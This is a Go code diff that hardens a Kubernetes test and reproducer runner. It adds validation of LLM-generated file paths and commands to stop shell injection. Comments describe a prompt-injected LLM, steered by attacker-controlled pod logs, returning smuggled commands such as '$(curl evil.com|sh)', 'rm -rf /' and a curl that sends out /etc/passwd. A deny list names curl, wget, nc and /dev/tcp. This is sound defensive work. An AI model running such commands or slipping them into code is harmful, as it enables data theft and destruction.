@@ -9,11 +9,12 @@
 package executors
 
 import (
-	"github.com/karimzakzouk/sentinel/internal/logging"
+        "github.com/karimzakzouk/sentinel/internal/logging"
         "bytes"
         "context"
         "fmt"
         "log"
+        "path/filepath"
         "strings"
         "time"
 
@@ -77,14 +78,27 @@ func (r *TestRunner) RunTest(ctx context.Context, fixCanaryImage, sandboxNS stri
                 }, nil
         }
 
+        // SECURITY (C2 fix): Validate the LLM-generated test file path + command
+        // before interpolating them into a shell command. A prompt-injected LLM
+        // could return malicious values like TestFile="$(curl evil|sh)".
+        validatedTestFile := validateTestFilePath(test.TestFile)
+        if validatedTestFile == "" {
+                logging.Info("SECURITY (C2): test file path rejected, using default", "original", test.TestFile)
+                validatedTestFile = "test_generated.py"
+        }
+        testCmd := validateTestCommand(test.TestCommand, test.TestLanguage, test.TestFramework, validatedTestFile)
+        if testCmd == "" {
+                testCmd = defaultTestCommand(test.TestLanguage, test.TestFramework, validatedTestFile)
+        }
+
         log.Printf("[testrunner] running test %s in %s (framework=%s, cmd=%s)",
-                test.TestFile, sandboxNS, test.TestFramework, test.TestCommand)
+                validatedTestFile, sandboxNS, test.TestFramework, testCmd)
 
         // 1. Create a ConfigMap with the test file content.
         // ConfigMap keys can't contain "/" — use just the filename (last path segment).
         // The full path is preserved in the pod by creating subdirectories.
 
-        cmKey := test.TestFile
+        cmKey := validatedTestFile
         if idx := strings.LastIndex(cmKey, "/"); idx >= 0 {
                 cmKey = cmKey[idx+1:]
         }
@@ -115,13 +129,6 @@ func (r *TestRunner) RunTest(ctx context.Context, fixCanaryImage, sandboxNS stri
 
         testPodName := fmt.Sprintf("test-runner-%d", time.Now().Unix())
 
-        // Determine the test command based on language/framework if not specified
-
-        testCmd := test.TestCommand
-        if testCmd == "" {
-                testCmd = defaultTestCommand(test.TestLanguage, test.TestFramework, test.TestFile)
-        }
-
         // Build the pod spec
         // The pod:
         //   1. Mounts the test file from the ConfigMap to /app/<test_file>
@@ -151,7 +158,7 @@ func (r *TestRunner) RunTest(ctx context.Context, fixCanaryImage, sandboxNS stri
                                                                 "cp /test-file/%s /app/%s && "+
                                                                 "cd /app && "+
                                                                 "%s 2>&1 || true",
-                                                        test.TestFile, cmKey, test.TestFile, testCmd,
+                                                        validatedTestFile, cmKey, validatedTestFile, testCmd,
                                                 ),
                                         },
                                         VolumeMounts: []corev1.VolumeMount{
@@ -219,7 +226,7 @@ func (r *TestRunner) RunTest(ctx context.Context, fixCanaryImage, sandboxNS stri
 }
 
 // waitForPodCompletion waits for a pod to reach Succeeded/Failed state.
-// Returns the pod's logs. v4.3.2: containerName parameter added — was
+// Returns the pod's logs.containerName parameter added — was
 // hardcoded to "test-runner" which broke when the reproducer runner used
 // "repro-runner" as its container name.
 
@@ -240,7 +247,7 @@ func (r *TestRunner) waitForPodCompletion(ctx context.Context, ns, name, contain
                         // Pod completed — fetch logs
 
                         req := r.clientset.CoreV1().Pods(ns).GetLogs(name, &corev1.PodLogOptions{
-                                Container: containerName, // v4.3.2: was hardcoded "test-runner"
+                                Container: containerName, //was hardcoded "test-runner"
                         })
                         stream, err := req.Stream(ctx)
                         if err != nil {
@@ -271,9 +278,29 @@ func (r *TestRunner) RunReproducer(ctx context.Context, canaryImage, sandboxNS s
         log.Printf("[testrunner] running reproducer %s in %s (lang=%s)",
                 reproducer.ScriptFile, sandboxNS, reproducer.ScriptLanguage)
 
+        // SECURITY (C2 fix): Validate the LLM-generated reproducer script path +
+        // run command before interpolating them into a shell command.
+        validatedScriptFile := validateTestFilePath(reproducer.ScriptFile)
+        if validatedScriptFile == "" {
+                logging.Info("SECURITY (C2): reproducer script path rejected, using default", "original", reproducer.ScriptFile)
+                validatedScriptFile = "reproduce_error.py"
+        }
+        // Reproducer commands are more varied than test commands (could be
+        // `python reproduce.py`, `node repro.js`, `ruby repro.rb`, etc.) but
+        // we still validate via validateTestCommand to restrict to known runners.
+        runCmd := validateTestCommand(reproducer.RunCommand, reproducer.ScriptLanguage, "", validatedScriptFile)
+        if runCmd == "" {
+                runCmd = defaultReproducerCommand(reproducer.ScriptLanguage, validatedScriptFile)
+        }
+
         // 1. Create a ConfigMap with the script content
 
         cmName := fmt.Sprintf("repro-%d", time.Now().Unix())
+        // Use a safe ConfigMap key derived from the validated script file name.
+        cmKey := validatedScriptFile
+        if cmKey == "" {
+                cmKey = "reproduce_error.py"
+        }
         reproCM := &corev1.ConfigMap{
                 ObjectMeta: metav1.ObjectMeta{
                         Name:      cmName,
@@ -281,7 +308,7 @@ func (r *TestRunner) RunReproducer(ctx context.Context, canaryImage, sandboxNS s
                         Labels:    map[string]string{"sentinel.io/sandbox": "true"},
                 },
                 Data: map[string]string{
-                        reproducer.ScriptFile: reproducer.ScriptContent,
+                        cmKey: reproducer.ScriptContent,
                 },
         }
         _, err := r.clientset.CoreV1().ConfigMaps(sandboxNS).Create(ctx, reproCM, metav1.CreateOptions{})
@@ -295,10 +322,6 @@ func (r *TestRunner) RunReproducer(ctx context.Context, canaryImage, sandboxNS s
         // 2. Create a pod that runs the reproducer
 
         reproPodName := fmt.Sprintf("repro-runner-%d", time.Now().Unix())
-        runCmd := reproducer.RunCommand
-        if runCmd == "" {
-                runCmd = defaultReproducerCommand(reproducer.ScriptLanguage, reproducer.ScriptFile)
-        }
 
         reproPod := &corev1.Pod{
                 ObjectMeta: metav1.ObjectMeta{
@@ -320,7 +343,7 @@ func (r *TestRunner) RunReproducer(ctx context.Context, canaryImage, sandboxNS s
                                         Args: []string{
                                                 fmt.Sprintf(
                                                         "cp /repro-file/%s /app/%s && cd /app && %s 2>&1",
-                                                        reproducer.ScriptFile, reproducer.ScriptFile, runCmd,
+                                                        validatedScriptFile, validatedScriptFile, runCmd,
                                                 ),
                                         },
                                         VolumeMounts: []corev1.VolumeMount{
@@ -351,7 +374,7 @@ func (r *TestRunner) RunReproducer(ctx context.Context, canaryImage, sandboxNS s
 
         // 3. Wait for completion
 
-        podOutput, err := r.waitForPodCompletion(ctx, sandboxNS, reproPodName, "repro-runner", 120*time.Second) // v4.3.2: was missing container name
+        podOutput, err := r.waitForPodCompletion(ctx, sandboxNS, reproPodName, "repro-runner", 120*time.Second) //was missing container name
         if err != nil {
                 return &TestResult{
                         Overall: false,
@@ -487,4 +510,108 @@ func interpretTestOutput(output, framework string) bool {
         // This is a fallback; the pod's Phase=Succeeded is checked by the caller
 
         return true
+}
+
+// ─── SECURITY (C2 fix): validate LLM-generated file paths + commands ────────
+// The LLM generates test file paths, test commands, reproducer script paths,
+// and reproducer run commands. These are interpolated into shell commands
+// via fmt.Sprintf, which means a prompt-injected LLM (influenced by
+// attacker-controllable pod logs) could return malicious values like:
+//   TestFile = "$(curl evil.com|sh)"
+//   TestCommand = "rm -rf / && false"
+//   ScriptFile = "; curl evil.com/exfil?d=$(cat /etc/passwd)"
+// validateTestFilePath rejects paths with shell metacharacters, path
+// traversal, absolute paths, or control characters. It mirrors the
+// validateFilePath logic from agents/fix_proposer.go but is duplicated
+// here to avoid a circular import (executors → agents → executors).
+// validateTestCommand restricts the command to a known-safe subset:
+//   - must start with a known test runner binary (python, pytest, go, node,
+//     npx, ruby, cargo, mvn)
+//   - must not contain shell metacharacters beyond simple flags, paths,
+//     and the && separator
+//   - must not contain redirects (>, <) or backticks or $()
+
+func validateTestFilePath(path string) string {
+        if path == "" {
+                return ""
+        }
+        if len(path) > 500 {
+                logging.Info("SECURITY (C2): rejecting test path (too long)", "path", path)
+                return ""
+        }
+        // Reject control chars and null bytes.
+        for _, r := range path {
+                if r < 0x20 || r == 0x7f {
+                        logging.Info("SECURITY (C2): rejecting test path (control char)", "path", path)
+                        return ""
+                }
+        }
+        // Reject shell metacharacters — test paths must be plain file paths.
+        shellMetachars := []string{"$", "`", ";", "|", "&", "(", ")", "{", "}", "<", ">", "\n", "\r", "*", "?", "[", "]", "!", "#", "~"}
+        for _, ch := range shellMetachars {
+                if strings.Contains(path, ch) {
+                        logging.Info("SECURITY (C2): rejecting test path (shell metachar)", "path", path, "char", ch)
+                        return ""
+                }
+        }
+        // Reject absolute paths.
+        if filepath.IsAbs(path) {
+                logging.Info("SECURITY (C2): rejecting absolute test path", "path", path)
+                return ""
+        }
+        clean := filepath.Clean(path)
+        if clean == "." {
+                logging.Info("SECURITY (C2): rejecting test path (resolves to repo root)", "path", path)
+                return ""
+        }
+        if strings.HasPrefix(clean, "..") {
+                logging.Info("SECURITY (C2): rejecting test path traversal", "path", path)
+                return ""
+        }
+        return clean
+}
+
+// validateTestCommand restricts an LLM-generated test command to a known-safe
+// subset. Returns the cleaned command, or "" if the command is rejected.
+// When empty, the caller should fall back to defaultTestCommand().
+func validateTestCommand(cmd, language, framework, testFile string) string {
+        if cmd == "" {
+                return ""
+        }
+        cmd = strings.TrimSpace(cmd)
+        if cmd == "" {
+                return ""
+        }
+        if len(cmd) > 500 {
+                logging.Info("SECURITY (C2): rejecting test command (too long)", "cmd", cmd)
+                return ""
+        }
+        // Reject dangerous shell constructs entirely.
+        dangerous := []string{"`", "$(", "${", "&&", "||", ";", "|", ">", "<", "&", "\n", "\r", "curl", "wget", "nc ", "nc$", "/dev/tcp", "bash ", "sh ", "python -c", "python3 -c", "eval ", "exec ", "source ", ". "}
+        lower := strings.ToLower(cmd)
+        for _, d := range dangerous {
+                if strings.Contains(lower, d) {
+                        logging.Info("SECURITY (C2): rejecting test command (dangerous construct)", "cmd", cmd, "pattern", d)
+                        return ""
+                }
+        }
+        // Must start with a known test runner binary.
+        allowedPrefixes := []string{
+                "python ", "python3 ", "python -m pytest", "python3 -m pytest",
+                "pytest ", "pytest$", "go test", "node ", "npx jest", "npx mocha",
+                "npx vitest", "jest ", "mocha ", "ruby ", "cargo test", "mvn test",
+                "gradle test", "dotnet test", "echo ",
+        }
+        matched := false
+        for _, prefix := range allowedPrefixes {
+                if strings.HasPrefix(lower, prefix) || lower == strings.TrimSpace(prefix) {
+                        matched = true
+                        break
+                }
+        }
+        if !matched {
+                logging.Info("SECURITY (C2): rejecting test command (unknown runner)", "cmd", cmd)
+                return ""
+        }
+        return cmd
 }
